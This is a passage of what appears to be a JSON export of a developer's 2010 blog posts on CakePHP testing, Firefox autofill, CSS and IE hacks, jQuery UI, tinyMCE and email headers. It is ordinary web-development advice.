/>\t// Overriding the header method. If not set, will generate 'Headers already set' errors;<br />\tfunction header($header) {<br />\t\t$this-&gt;header = $header;<br />\t}<br />\t// Overriding render method to keep track of the rendered error<br />\tfunction render($action) {<br />        \t$this-&gt;renderedAction = $action;<br />        \treturn parent::render($action);<br />\t}<br />}<br /></code></pre>\n<h4>Creating a TestErrorHandler</h4>\n<p>This class will extends your <code>AppError</code>. It will just overwrite two methods to make it correctly work in a test case.</p>\n<p>First, we'll need to overwrite the <code>__construct</code>. The default construct will set the inner <code>$this-&gt;controller</code> property to either a <code>Controller </code>or a <code>CakeErrorController </code>instance depending if its the first error fired or not. I must admit that I haven't really understand the difference between the two. But I know that <code>CakeErrorController </code>extends <code>AppController </code>while <code>Controller </code>extends <code>Object</code>.</p>\n<p>And as we need to overwrite methods of this property, it being a <code>CakeErrorController </code>is great, while it being a <code>Controller </code>is bad. Anyway, what I did was copy/paste the parent <code>__construct</code> into <code>TestErrorHandler </code>and just force it to always create a <code>CakeErrorController </code>instance.</p>\n<p>The other method we need to overwrite is the <code>_stop</code>. If we don't, the whole script will halt after the first error you'll test.</p>\n<p>So, enough talk, here's the code :</p>\n<pre><code lang=\"php\">class TestErrorHandler extends AppError {<br />\t// Copy/paste of ErrorHandler construct method, but force a new instance of CakeErrorController as $this-&gt;controller each time<br />\t// CakeErrorController extends AppController, so we can overwrite its methods<br />\tfunction __construct($method, $messages) {<br />\t\tApp::import('Core', 'Sanitize');<br /><br />\t\t// Forcing CakeErrorController<br />\t\t$this-&gt;controller =&amp; new CakeErrorController();<br />\t\t$options = array('escape' =&gt; false);<br />\t\t$messages = Sanitize::clean($messages, $options);<br /><br />\t\tif (!isset($messages[0])) {<br />\t\t\t$messages = array($messages);<br />\t\t}<br /><br />\t\tif (method_exists($this-&gt;controller, 'apperror')) {<br />\t\t\treturn $this-&gt;controller-&gt;appError($method, $messages);<br />\t\t}<br /><br />\t\tif (!in_array(strtolower($method), array_map('strtolower', get_class_methods($this)))) {<br />\t\t\t$method = 'error';<br />\t\t}<br />\t\tif ($method !== 'error') {<br />\t\t\tif (Configure::read('debug') == 0) {<br />\t\t\t\t$parentClass = get_parent_class($this);<br />\t\t\t\tif (strtolower($parentClass) != 'errorhandler') {<br />\t\t\t\t\t$method = 'error404';<br />\t\t\t\t}<br />\t\t\t\t$parentMethods = array_map('strtolower', get_class_methods($parentClass));<br />\t\t\t\tif (in_array(strtolower($method), $parentMethods)) {<br />\t\t\t\t\t$method = 'error404';<br />\t\t\t\t}<br />\t\t\t\tif (isset($code) &amp;&amp; $code == 500) {<br />\t\t\t\t\t$method = 'error500';<br />\t\t\t\t}<br />\t\t\t}<br />\t\t}<br />\t\t$this-&gt;dispatchMethod($method, $messages);<br />\t\t$this-&gt;_stop();<br />\t}<br /><br />\t// Preventing the error from stopping all the request<br />\tfunction _stop() {<br />\t\treturn;<br />\t}<br />}<br /></code></pre>\n<h4>Writing your tests</h4>\n<p>Ok, your almost done. You just have now to write your tests. They have to follow a special syntax to correctly work.</p>\n<p>First, you'll have to wrap your <code>ErrorHandler </code>creation between <code>ob_start()</code> and <code>$output= ob_get_content()</code>, otherwise you'll end up with error popping right into your test case because the <code>ErrorHandler </code>force the controller to render the view.</p>\n<p>You'll be able to access interesting properties through <code>$errorHandler-&gt;controller-&gt;renderedAction</code> and <code>$errorHandler-&gt;controller-&gt;header</code>. You can also directly test the view output through <code>$output</code>.</p>\n<p>Ok, so here's one of my tests :</p>\n<pre><code lang=\"php\">// DEV : Error will use the error layout<br />function testCallingErrorInDevWillUseErrorLayout() {<br />\tob_start();<br />\t$errorHandler = new TestErrorHandler('missingController', $this-&gt;errorParams);<br />\t$result = ob_get_clean();<br />\t$this-&gt;assertEqual($errorHandler-&gt;controller-&gt;layout, 'error');<br />}<br /></code></pre>\n<h4>Conclusion</h4>\n<p>It took me some hours to glue all this pieces together, I hope it may be useful to others, too. Writing the <code>AppError </code>itself was way easier, but as I'm now test infected I don't imagine writing code without the corresponding tests.</p>",
  "publish_start": "2010-08-08 01:53:00",
  "slug": "testing-a-custom-errorhandler-in-cakephp"
}, {
  "id": 219,
  "name": "How to fix the Firefox autocomplete 'feature'",
  "text": "<p>Firefox can be quite a pain sometimes. I usually praise this browser features but today I had to deal with one tricky 'intelligent' feature.</p>\n<p>You know that autocomplete/autofill feature, so that when you enter your user name, Firefox automatically fill the corresponding password field so you won't have to do it ?</p>\n<p>Well, it is bad, and here's why.</p>\n<h4>How does it work ?</h4>\n<p>I haven't read the source code, but from what I've experienced it seems to work like that :</p>\n<p>For each password field, FF will find the related username text field. This is just a very basic search, it assume that the closest previous text field is the related one. Now, everytime you enter a value in the text field that match one of the username saved, it will autofill the password field.</p>\n<p>Note that if you have more than 5 password fields on a page, the feature will be disabled.</p>\n<h4>What is terribly wrong with this approach</h4>\n<p>Let's imagine you are a registered user of a website. You want to update your preferences. You have a nice page with lots of input fields where you can change your email, password and date of birth.</p>\n<p>For security reasons, your password is not displayed. For convenient reasons, the website also don't ask you to type your password everytime your want to update your settings. It assumes that if you let the password field blank, it means that you don't want to change it. And if you really want to change it, then it asks for a confirmation, to make sure your correctly typed it.</p>\n<p>So, with this autocomplete feature, if your email is also your login for the website (as it is often the case), Firefox will autofill the password field with your password. Meaning that if you submit your form, you'll be met with an error because your password and it's confirmation does not match.</p>\n<p>You'll then have to manually clear the content of the password field everytime your want to edit your profile. Which is counter-intuitive. The whole convenient method of not changing the password if left empty is rendered useless.</p>\n<p>The worst part is that most users won't understand when the error comes and will blame the webdeveloper.</p>\n<h4>Solutions that does not work</h4>\n<p>First, Firefox is just doing a very wild guess on that fields. And, there is no way to disable this feature from the page markup. Sure, as a user you can disable it in your browser setting, but as a web developper, you can't disable it.</p>\n<p>There is a non-standard <code>autocomplete=\"off\"</code> argument, but it does not work in our case. It is supposed to prevent the browser to store previously entered values on sensible fields (like credit card numbers).</p>\n<p>I've tried putting this <code>autocomplete </code>attribute on every input field, even on the form itself. Setting the <code>value </code>attribute does not work either. Even updating the value through Javascript would not work because the password field will get re-populated on every blur event on the text field.</p>\n<h4>A solution that does work</h4>\n<p>The final solution I've found is to add a dummy password field between your real mail and password fields. That way, Firefox will autocomplete this dummy password instead of the real one.</p>\n<p>Unfortunatly this adds clutter to your markup, but with a little <code>display:none</code> in CSS it won't ever be seen by your users.</p>",
  "publish_start": "2010-08-12 12:59:00",
  "slug": "how-to-fix-the-firefox-autocomplete-feature"
}, {
  "id": 220,
  "name": "Corrupted strings when using strtolower()",
  "text": "<p><em>Little blog post at 5am, I'll try to make it very short, I need some sleep.</em></p>\n<p>To avoid getting corrupted string results when calling <code>strtolower </code>on UTF8 strings, you can call <code>mb_strtolowe</code>r instead. The <code>mb_*</code> functions are aware of the utf8 encoding.</p>\n<p>Unfortunatly, sometime you just can't, because the call is made in the cakePHP core (<code>Inflector</code>). Defining a <code>CTYPE </code>locale for your whole app may be a better solution.</p>\n<p>Just add a <code>setlocale(LC_CTYPE, 'C');</code> in your app and all your utf8 strings will correctly work with string functions.</p>\n<p>Just note that on Windows, calling setlocale will change the locale for all threads, not just the one where PHP is running. This may cause unexpected results.</p>",
  "publish_start": "2010-08-17 04:57:00",
  "slug": "corrupted-strings-when-using-strtolower"
}, {
  "id": 221,
  "name": "How to hide/show elements based on Javascript",
  "text": "<p>Sometimes you have a really great design with some really fancy Javascript goodness, like drag'n'drop and other shiny Ajaxy stuff.</p>\n<p>But when you browse the website with Javascript disabled, none of that works and you end up with interface elements that should'nt be here because they do not work.</p>\n<p>In those case, you'd rather display a nice message to your user, telling him that he can't use the feature withou Javascript enabled.</p>\n<h4>But how do you do that ?</h4>\n<p>Well, I myself load two different stylesheets. Remember that your website should be working without Javascript, this is just the last layer you add.</p>\n<p>My default stylesheet will load all the rules for when Javascript is not enabled. No fancy <code>cursor:move</code> here.</p>\n<p>Then I load a second stylesheet using Javascript, using <code>document.write()</code> in the <code>&lt;head&gt;</code>. And that's in this one that I write rules that overload the previous one. I add every styling that deals with Javascript-enabled features here.</p>\n<h4>Limitations</h4>\n<p>I may be changing the way I load the JS stylesheet in the future. I don't really like relying on <code>document.write</code> because it is <em>evil</em>. I also don't like the idea of getting one extra request.</p>\n<p>I could add a <code>js</code> class to my body element (like <a title=\"Modernizr\" href=\"http://www.modernizr.com/\" target=\"_blank\">modernizr</a> does with all its CSS3 properties) and then target elements by prepending <code>.js</code> to the rule.</p>\n<p>But it means adding rules in my main CSS file for users without JS that will still be downloading those extra useless bytes.</p>\n<p>I haven't yet figured which way was the best (or should I say, the worst)</p>\n<h4>Convenient methodes</h4>\n<p>Whatever way you choose, one thing that really helped me was two real simple classes : <code>jsOn </code>and <code>jsOff </code>that I add to elements.</p>\n<p>Elements with <code>jsOn </code>will only be visible if Javascript is enabled and hidden otherwise, while element with <code>jsOff </code>will do the opposite.</p>\n<p>Assuming you mark your body element with a <code>js</code> class if Javascript is enabled, here's how to do it :</p>\n<pre><code lang=\"css\">.jsOn { display:none; }<br />.js .jsOn { display:block; }<br />.jsOff { display:block;}<br />.js .jsOff { display:none; }<br /></code></pre>\n<p>Hope all that helps at least someone.</p>",
  "publish_start": "2010-08-19 14:29:00",
  "slug": "how-to-hide-show-elements-based-on-javascript"
}, {
  "id": 222,
  "name": "Text emboss in CSS",
  "text": "<p>I know only two <em>unperfect </em>ways of displaying an emboss text in CSS. As we can't use inset shadows with <code>text-shadow</code>, unlike <code>box-shadow</code>, we have to resort to other hacky ways.</p>\n<p>Let me show you what can be done.</p>\n<h4>Simulate it with an optical illusion</h4>\n<p>Instead of creating a real inner shadow, you can just create an optical illusion by adding the correct shadow to make the viewer believe your text is embossed.</p>\n<p>If you have dark text, just add a subtle white shadow at the bottom, while if you have light text, just add a subtle black one at the top.</p>\n<pre><code lang=\"html\">&lt;a class=\"emboss light\"&gt;Lorem ipsum&lt;/a&gt;<br />&lt;a class=\"emboss dark\"&gt;Lorem ipsum&lt;/a&gt;<br /></code></pre>\n<pre><code lang=\"css\">.emboss { font-size:1.2em; padding:50px; font-weight:bold; background:#0A539C; display:block; }<br />.light { color:#FFFFFF; text-shadow:0px -1px 0px rgba(0,0,0,0.9); }<br />.dark { color:#000000; text-shadow:0px 1px 0px rgba(255,255,255,0.1); }<br /></code></pre>\n<p>I added an <code>emboss </code>class to more easily spot the effect, but the important code is in the <code>light </code>and <code>dark </code>rules.</p>\n<h4>Add an almost transparent layer</h4>\n<p>For this second solution we will simply add a second layer with the exact same text above the first text. Just slightly moving it and making it partly transparent.</p>\n<p>You could add twice your element in your markup, but that would be bad for accesibility as well as SEO, so we'll instead use the <code>:before</code> pseudo-class.</p>\n<p>We can set the <code>:before</code> content using the <code>content:</code> property, and we can also use the<code> attr()</code> method to get the content of one of our element's attributes. We just need to put the exact same text in one of our attributes and we're good to go.</p>\n<p>This can be easily done with a link and its <code>title </code>attribute.</p>\n<pre><code lang=\"html\">&lt;a class=\"emboss lightAgain\" title=\"Lorem ipsum\"&gt;Lorem ipsum&lt;/a&gt;<br />&lt;a class=\"emboss darkAgain\" title=\"Lorem ipsum\"&gt;Lorem ipsum&lt;/a&gt;<br /></code></pre>\n<pre><code lang=\"css\">.lightAgain { color:#FFFFFF; position:relative; }<br />.lightAgain:before {<br />    content: attr(title);<br />    position:absolute;<br />    color:rgba(0,0,0,0.1);<br />    top:-1px;<br />    left:-1px;<br />    padding:50px;<br />}<br />.darkAgain { color:#000000; position:relative; }<br />.darkAgain:before {<br />    content: attr(title);<br />    position:absolute;<br />    color:rgba(255,255,255,0.1);<br />    top:1px;<br />    left:1px;<br />    padding:50px;<br />}<br /></code></pre>\n<p>The effect is much better with this technique but it also has it share of drawback :</p>\n<ul>\n<li>You have to write your content twice, once in the element and once in an attribute</li>\n<li>You have to copy all your <code>padding </code>rules in the <code>:before </code>element or it won't get correctly positionned</li>\n<li>You can't select the text with this effect</li>\n</ul>\n<p>Hope those two little techniques helped someone, anyway.</p>",
  "publish_start": "2010-08-19 22:44:00",
  "slug": "text-emboss-in-css"
}, {
  "id": 223,
  "name": "How to prevent a FOUC but still gracefully degrade the jQuery UI tabs",
  "text": "<p>I finally managed to fix something that was bugging me for a very long time. I'm talking about the jQuery UI tabs.</p>\n<p>They are pretty useful actually, but I always hated that <abbr title=\"Flash Of Unstyled Content\">FOUC</abbr> they produce. For one split second, you'll see all your tabs content, then they'll be neatly re-arranged in tabs.</p>\n<p>What I want are my tabs displayed correctly right away, on first load.</p>\n<h4>First, the markup</h4>\n<p>Here's a typical tabs markup :</p>\n<pre><code lang=\"html\">&lt;div class=\"tabs\"&gt;<br />    &lt;ul&gt;<br />        &lt;li&gt;&lt;a href=\"#firstTab\"&gt;First tab&lt;/a&gt;&lt;/li&gt;<br />        &lt;li&gt;&lt;a href=\"#secondTab\"&gt;Second tab&lt;/a&gt;&lt;/li&gt;<br />    &lt;/ul&gt;<br /><br />    &lt;div class=\"tabPanel\" id=\"firstTab\"&gt;<br />        First tab content<br />    &lt;/div&gt;<br />    <br />    &lt;div class=\"tabPanel\" id=\"secondTab\"&gt;<br />        Second tab content<br />    &lt;/div&gt;<br />&lt;/div&gt;<br /></code></pre><h4>CSS to hide all tabs if Javascript is disabled</h4>\n<p>If your Javascript is disabled, so will jQuery UI. We will then hide the <code>&lt;ul&gt;</code> because it serves no purpose here. We will only show it if js is enabled</p>\n<pre><code lang=\"css\">.tabs ul { display:none; }<br />.js .tabs ul { display:block; }<br /></code></pre><h4>Applying jQuery UI tabs</h4>\n<p>By doing a<code> $('.tabs').tabs();</code> jQuery UI will treat your <code>&lt;ul&gt;</code> as  your tab menu and all your <code>.tabPanel</code> as their corresponding contents. It will hide all your panels, except for the first one. It does so by adding a<code> .ui-tabs-panel</code> class to every <code>.tabPanel</code> as well as a <code>.ui-tabs-hide</code> to every panel it hides.</p>\n<p>Right now, you should add another CSS rule to hide the unused panels :</p>\n<pre><code lang=\"css\">.ui-tabs-hide { display: none; }<br /></code></pre><p>But if you look at your page now, you'll see all your tabs content before they get hidden. That is the FOUC I was talking about. The jQuery UI documentation indicate that to remove it, you should directly add the <code>.ui-tabs-hide</code> class to panels you'll want to hide.</p>\n<p>As also pointed in the doc, it will not gracefully degrade because users without Javascript won't even be able to see your other tabs. Also, it asks you to add server-side logic (HTML markup with jQuery specific classes) for something that should be handled entirely client-side.</p>\n<h4>Removing the FOUC while gracefully degrade</h4>\n<p>Ok, so what I did was writing two simple rules that will directly hide all unused panels while still displaying the active one, even before jQuery UI takes action.</p>\n<pre><code lang=\"css\">.js .tabPanel + .tabPanel { display:none;}<br /></code></pre><p>That way, no FOUC, and users without Javascript still see all the content. Unfortunatly, if you now try clicking on your tabs, you'll see that nothing happens and you get stuck with your default panel always visible.</p>\n<h4>Fixing the jQuery UI tabs</h4>\n<p>As jQuery will add new classes to my elements, I'll just have to write more specific rules that use those classes. Here's the little piece of logic I came up with :</p>\n<pre><code lang=\"css\">.js .tabPanel.ui-tabs-panel { display:block;}<br />.js .tabPanel.ui-tabs-panel.ui-tabs-hide { display:none;}<br /></code></pre><p>All the jQuery panels are shown, except for the one hidden by jQuery. All those rules being more and more specific, they will get applied once the tabs are activated but still override the previous <code>display:</code> declarations.</p>\n<h4>Conclusion</h4>\n<p>This is how I fixed an issue that was bugging me for years. Unfortunatly the CSS rules being dependent on the markup used, I haven't yet been able to write them in a global form that could be added to the main jQuery UI css files.</p>",
  "publish_start": "2010-08-21 18:37:00",
  "slug": "prevent-fouc-gracefully-degrade-jquery-ui-tabs"
}, {
  "id": 224,
  "name": "CSS for Javascript enabled browsers",
  "text": "<p>In a previous post I was wondering if my way of loading js-specific CSS rules was right. I was loading a specific css file for js overrides.</p>\n<p>This allow for lighter stylesheets for users without Javascript (they won't load useless rules), but also resulted in slower rendering for other users because they needed to load two stylesheets instead of one.</p>\n<p>After much pondering, I now think that loading all the rules in one stylesheet is the way to go.</p>\n<p>In addition with the number of request mentionned, keeping all your rules in the same file is much more easier to maintain. Js-specific rules aren't that big either so the small additional bytes are usually better than a full http request.</p>\n<p>I now prefix all my Javascript rules by <code>.js</code>. I add a <code>js</code> class to the <code>html </code>element directly from the <code>head</code>, this helps in preventing any FOUC that may occur because we add the class before the <code>body</code> rendering.</p>\n<pre><code lang=\"html\">&lt;head&gt;<br />    &lt;script&gt;document.documentElement.className+=' js';&lt;/script&gt;<br />&lt;/head&gt;<br /></code></pre>\n<p> </p>",
  "publish_start": "2010-08-21 19:28:00",
  "slug": "css-for-javascript-enabled-browsers"
}, {
  "id": 227,
  "name": "Copy/Paste text from Word into tinyMCE",
  "text": "<p>What good is building a really nice CMS with top-notch WYSIWYG editor if you handed it to clients that will blindly copy/paste Word documents into it ?</p>\n<p>Well, it will just render a big ugly mess of proprietary and contradictory pseudo-css rules. You could even be blamed for it.</p>\n<h4>The solution</h4>\n<p>The latest versions of tinyMCE came bundled with an improved <code>paste </code>plugin. It will automatically attempt to clean bad pasted text by operating some dark voodoo magic on it.</p>\n<p>It does it quite well to be honest, removing almost all messy formatting. From the tests I tried, I was still getting useless crap in the resulting text (CSS comments, <code>&lt;span&gt;</code> with overly long style of color and background-color definitions, etc).</p>\n<p>I finally decided to take a more brutal approach. The <code>paste </code>plugin contained a <code>_insertPlainText</code> method that was supposed to be used in conjunction with a toolbar icon.</p>\n<p>This method removes all formatting. Period.</p>\n<p>As I didn't want to have to click on a toolbar icon before pasting my text (and none of my actual clients would ever think of doing that either), I came up with a very simple plugin to do the boring stuff for me.</p>\n<h4>The plugin</h4>\n<p>The only goal of this plugin is setting to <code>true </code>the <code>pasteAsPlainText </code>property of every editor. This property is defaulted to <code>false </code>but can be swapped using the toolbar icon.</p>\n<p>I also forced the <code>paste_text_sticky</code> setting to <code>true</code>, preventing the previous property to revert to <code>false </code>after the first pasting.</p>\n<p>Here's my plugin full code :</p>\n<p>Be sure to include the <code>paste </code>plugin in your plugin list, and insert my plugin <strong>after </strong>the paste plugin.</p>\n<pre><code lang=\"js\">/**<br /> *    Will automatically convert pasted text so no junk code will be included.<br /> *    This plugin depends on the core paste plugin.<br /> **/<br />(function() {<br />\ttinymce.create('tinymce.plugins.pasteAsPlainTextPlugin', {<br />\t\tinit : function(editor, url) {<br />\t\t\t// We force the pasting to occur as plain text<br />\t\t\teditor.pasteAsPlainText = true;<br />\t\t\t// We also put it as sticky to allow for multiple pastings<br />\t\t\teditor.settings.paste_text_sticky = true;<br /><br />\t\t\t// Adding some special post process<br />\t\t\teditor.settings.paste_postprocess = function(a, o) {<br />\t\t\t\tvar text = o.content,<br />\t\t\t\t\tsplit = String.fromCharCode(13)+String.fromCharCode(10)<br />\t\t\t\t;<br /><br />\t\t\t\t// If content is long text without HTML, We'll break it into &lt;p&gt;ieces<br />\t\t\t\tif (text.charAt(0)!='&lt;' &amp;&amp; text.indexOf(split)!=-1) {<br />\t\t\t\t\t// Adding &lt;p&gt; around each line<br />\t\t\t\t\tvar node = document.createElement('div'),<br />\t\t\t\t\t\tsentences = text.split(split)<br />\t\t\t\t\t;<br />\t\t\t\t\tfor(var i=0,max=sentences.length;i!=max;i++) {<br />\t\t\t\t\t\tnode.innerHTML+='&lt;p&gt;'+sentences[i]+'&lt;/p&gt;';<br />\t\t\t\t\t}<br /><br />\t\t\t\t\t// Saving back in original content/node<br />\t\t\t\t\to.node = node;<br />\t\t\t\t\to.content = node.innerHTML;<br />\t\t\t\t}<br />\t\t\t\treturn o;<br />\t\t\t}<br />\t\t}<br />\t});<br /><br />\t// Register plugin<br />\ttinymce.PluginManager.add('pasteAsPlainText', tinymce.plugins[pasteAsPlainTextPlugin]);<br />})();<br /></code></pre>\n<h4>Update</h4>\n<p>I added a <code>postprocess </code>calback after seing that the pasted text was a little too plain in Webkit. All my text was displayed on the same line, without the nice breaking into paragraph that Firefox showed.</p>\n<p>It occured because tinyMCE used the <code>event.clipboardData</code> property that Webkit browsers provides and allow for easy retrieving of clipboard data. Unfortunatly it returned a really plain text, and I had to apply a little loop to replace each new line with a paragraph.</p>",
  "publish_start": "2010-10-05 15:07:00",
  "slug": "copy-paste-text-from-word-into-tinymce"
}, {
  "id": 228,
  "name": "Openid redirect not working on Opera",
  "text": "<p>I had a hard time firguring out while my openId login method does not work correctly with Opera.</p>\n<p>I either ended up on the redirect page forever, or did not get redirected back to my website after Google check, or finally even get blackholed back on my own site.</p>\n<p>I only occured with Opera.</p>\n<p>I've read on various places that the security settings of Opera are made to prevent an automatic redirect to a website to be able to write cookie. This is a fair defense, but it does break the whole openId concept. Or at least my implementation.</p>\n<p>Some sites manages to get it to work, even on Opera (stackoverflow for example).</p>\n<p>I'll hide the openId login method for my Opera users until this is fixed or I find a solution.</p>",
  "publish_start": "2010-10-05 16:51:00",
  "slug": "openid-redirect-not-working-on-opera"
}, {
  "id": 229,
  "name": "Aborting an AJAX request with jQuery",
  "text": "<p>I needed a way to abort a pending AJAX request. I had a dialog box loaded through AJAX, but I let my users the possibility to close the window before it was completely loaded.</p>\n<p>I thought I could easily cancel a request using jQuery but it appears that there is no method to do that. I had to instead directly call the <code>.abort()</code> method on the XHR object returned by <code>$.ajax</code>.</p>\n<p>What I learned was that aborting an XHR request still triggered the jQuery ajax <code>complete </code>callback, and even passed a <code>success</code> as second argument.</p>\n<p>My complete callback was supposed to display the loaded window, so I really didn't want it to fire if the user closed the loading window.</p>\n<p>I finally had to check on the <code>XHR.status</code> property (200 if ok, 0 if aborted) to manually stop the <code>complete </code>callback.</p>\n<p>It felt surprising at first that an abort call is not intercepted as an error, but after a little more thinking, it is logical. An abort is something that the user asked for, so it shouldn't be considered an error (which is something that no one ever asked for).</p>\n<p>On the other hand, it feels strange to consider an abort as a success too. I guess the jQuery team didn't have a lot of request for an edge case like abort and didn't wrap their API around it, leaving us with the low level XHR object instead.</p>",
  "publish_start": "2010-10-06 18:19:00",
  "slug": "aborting-an-ajax-request-with-jquery"
}, {
  "id": 234,
  "name": "Setting the z-index of a jQuery UI datepicker",
  "text": "<p>I ran into a collision issue with two of my absolutly positionned elements on a form page. I had an invisible flash buttun (used to launch an upload process) as well as jQuery UI datepicker.</p>\n<p>The form was built in a way that when the datepicker was displayed, it was supposed to be on top of the invisible Flash button. Unfortunatly the button was in fact \"on top\" of the datepicker, but being invisible you do not notice it until you click.</p>\n<p>This resulted in an upload dialog popping up and many confused users.</p>\n<h4>The fix</h4>\n<p>The Flash <code>z-index</code> is fixed in my CSS (10), so I thought that adding a greater <code>z-index</code> to the jQuery UI datepicker in CSS would be enough.</p>\n<p>It is not. The jQuery UI datepicker seems to automatically set the <code>z-index</code> to 1, whatever you specified.</p>\n<p>I checked the <a title=\"jQuery UI datepicker page\" href=\"http://jqueryui.com/demos/datepicker/\" target=\"_blank\">datepicker options</a>, looking for a <code>zIndex</code> key, but found nothing...</p>\n<p>I tried the <code>beforeShow </code>event, to manually set the <code>z-index</code>, but it seems that jQuery still update my value to 1 AFTER the event.</p>\n<p>So I finally resorted to adding a small timeout to re-add my value after jQuery. This is a bit of a hack but given the context this is the only way I found.</p>\n<pre><code lang=\"js\">// Set the datepicker zIndex on load<br />element.datepicker({<br />[...]<br />\t'beforeShow': function(input, datepicker) {<br />\t\tsetTimeout(function() {<br />\t\t\t$(datepicker.dpDiv).css('zIndex', 100);<br />\t\t}, 500);<br />\t},<br />[...]<br />});<br /></code></pre><p> </p>",
  "publish_start": "2010-10-20 14:00:00",
  "slug": "setting-zindex-jquery-ui-datepicker"
}, {
  "id": 230,
  "name": "Displaying HTML mails sent from cakePHP in SquirrelMail",
  "text": "<p>I just stumble upon the fact that my automated multipart (text + html) mails sent from my apps weren't correctly displayed on SquirrelMail.</p>\n<p>I'm personnaly using GMail for my day to day email needs, but one of my client was using the default <a href=\"http://squirrelmail.org/\" target=\"_blank\">SquirrelMail</a> (v1.4.21) install on their <a href=\"http://www.dreamhost.com/\" target=\"_blank\">Dreamhost account</a>. The received mails are not correctly parsed and get displayed as plain text, even if the header clearly specifiy a <code>Content-Type: multipart/alternative; boundary=\"alt-\"</code></p>\n<p>The first culprit was that no boundary were given. This does not seem to cause GMail any problem, but I thought that SquirrelMail may choke on that. So I manually added a <code>$this-&gt;Email-&gt;_createboundary();</code> call before my <code>$this-&gt;Email-&gt;send();</code></p>\n<p>Still, no succes. After some googling I found a <a href=\"http://cakephp.lighthouseapp.com/projects/42648-cakephp/tickets/14-email-component-should-set-mime-version-header-when-sendas-html-or-both\" target=\"_blank\">bug report</a> for a similar problem. I tried adding the suggested MIME header, and that solved my problem.</p>\n<p>So here's my updated code :</p>\n<pre><code lang=\"php\">$this-&gt;Email-&gt;sendAs = 'both';<br />$this-&gt;Email-&gt;_createboundary();<br />$this-&gt;Email-&gt;__header[] = 'MIME-Version: 1.0';<br />$this-&gt;Email-&gt;send();</code></pre>\n<p>I'll now have to add those two additional line of code everytime I'll have to send a multipart (html + text) email in cakePHP, until it get fixed (no specified milestone).</p>",
  "publish_start": "2010-10-11 12:24:00",
  "slug": "displaying-html-mails-sent-from-cakephp-in-squirrelmail"
}, {
  "id": 232,
  "name": "Some CSS hacks to target IE6 and IE7",
  "text": "<p>After stopping using ugly IE hacks and moving to conditionnal comments to load a special IE stylesheet, I now use conditional comments to mark my body element with classes reflecting the current IE version.</p>\n<pre><code lang=\"html\">&lt;!--[if IE 6]&gt;&lt;body class=\"ie ie6 ie-lt8 ie-lt9\"&gt;&lt;![endif]--&gt;<br />&lt;!--[if IE 7]&gt;&lt;body class=\"ie ie7 ie-lt8 ie-lt9\"&gt;&lt;![endif]--&gt;<br />&lt;!--[if IE 8]&gt;&lt;body class=\"ie ie8 ie-lt9\"&gt;&lt;![endif]--&gt;<br />&lt;!--[if IE 9]&gt;&lt;body class=\"ie ie9\"&gt;&lt;![endif]--&gt;<br />&lt;!--[if !IE]&gt;&lt;!--&gt;&lt;body class=\"nie\"&gt;&lt;!--&lt;![endif]--&gt;<br /></code></pre><p>This saves me a lot of trouble : less files to manage and easier fixes to write. I quite happy with this solution and have tested it accross several projects for the past 3 months. It works really well.</p>\n<p>I had to work on a legacy project last week, where this technique wasn't implemented but all the css code was still compressed using CSSTidy. And I ran into a couple of issues.</p>\n<h4>CSSTidy messes the star and underscore hacks</h4>\n<p>Using the brilliant <code>_property</code> and <code>*property</code> hacks to target IE6 and IE7 does not work in conjunction with CSSTidy.</p>\n<p>For the <code>_property hack</code>, the property is kept as-is, with the underscore, but as they are alphabetically arranged, the <code>_background</code> gets added before the <code>background</code>, rendering it absolutly useless.</p>\n<p>On the other hand, on the <code>*property</code>, the <code>*</code> gets removed, and the value is merged with the original value of the correct property. Useless too.</p>\n<h4>Other solutions that worked</h4>\n<p>To avoid digging into CSSTidy one more time, I tried to find other ways to achieve the same effect.</p>\n<p>To target IE6 I used the <code>!ie6</code> hack by writing <code>.mySelector { property:value !ie6; }</code>. IE6 is dumb enough to understand any <code>!blahblah</code> as <code>!important</code>.</p>\n<p>I could have also used the fact that IE6 understands <code>.class1.class2</code> as <code>.class2</code>, and could have written <code>.ie6.mySelector {  property:value; }</code> (of course, you have absolutly no <code>class=\"ie6\"</code> in your code)</p>\n<p>To target IE7 I made a custom selector that its parsing engine is the only one to understand : <code>*:first-child + html .mySelector { property:value; }</code></p>\n<p> </p>",
  "publish_start": "2010-10-16 19:10:00",
  "slug": "css-hacks-target-ie6-ie7"
}, {
  "id": 233,
  "name": "Finding a string in multiple files",
  "text": "Lately I was receiving emails with just the text \"Blablabla\" from an  old (online) production server. This was obviously from an old debug  script that I should have put online and forgot.\n<p> </p>\n<p>Unfortunatly, I wasn't able to track down exactly from where it  originated. I had no mention of that string in my local files.</p>\n<p>So I connected to the serveur using ssh and ran the following command  : grep -R Blablabla /path</p>\n<p>After some processing, I got the incriminating file and was able to  delete it.</p>",
  "publish_start": "2010-10-19 09:32:00",
  "slug": "finding-string-multiple-files"
}, {
  "id": 236,
  "name": "The multi-tab admin problem",
  "text": "<p>Today I had to update an important zone file at my registrar. Because it was quite important, and because I already did an almost identical job a few months ago, I decided to copy-paste the old work.</p>\n<p>So I started by opening the <code>domain A</code> zone edit page. The  I opened a new tab, and loaded the <code>domain B</code> zone edit page.</p>\n<p>I selected the <code>domain B</code> content and copied it in the <code>domain A</code> page. I had to update some values, mostly IP addresses, and then validate the page.</p>\n<p>Instead of updating the <code>domain A</code> zones as I expected, it updated the <code>domain B</code> zones and left the <code>domain A</code> unchanged. Can you guess why ?</p>\n<h4>Session handling</h4>\n<p>My guess is that everytime I opened a new page, a Session was tracking my \"current\" domain, the one I was editing. So opening a new tab to a new domain changed my current domain from <code>domain A</code> to <code>domain B</code>.</p>\n<p>Therefore, when I updated the <code>domain A</code> zone, the next page was assuming I was editing the <code>domain B</code> page. If I had opened the tabs in reverse order, it would have worked seamlessly.</p>\n<h4>Why doing that ?</h4>\n<p>I have encountered a similar behavior in my own apps. By using the cakePHP Security behavior, a special security token is generated for each form. Its integrity is checked whenever a form is posted, and verify that no field has been tampered (no mandatory field has been deleted, no new field has been added).</p>\n<p>This is a great security component, but because a special key is stored on the Session side, it also means that whenever you open several tabs, only the latest can be correctly checked and all other one will get rejected.</p>\n<p>It bugs me at first, because I used to open several tabs whenever I need to \"batch add\" a lot of items. In real life, I found that I was almost the only person to do that... So I finally accepted the multi-tab restriction.</p>\n<p>Getting back to my registrar : I guess they did it that way because of security reasons too, but I found it particularly counter-intuitive in that case and that could have led to serious damages.</p>",
  "publish_start": "2010-11-08 13:57:36",
  "slug": "multi-tab-admin-problem"
}, {
  "id": 237,
  "name": "Using fonts hosted on a subdomain with @font-face and Firefox",
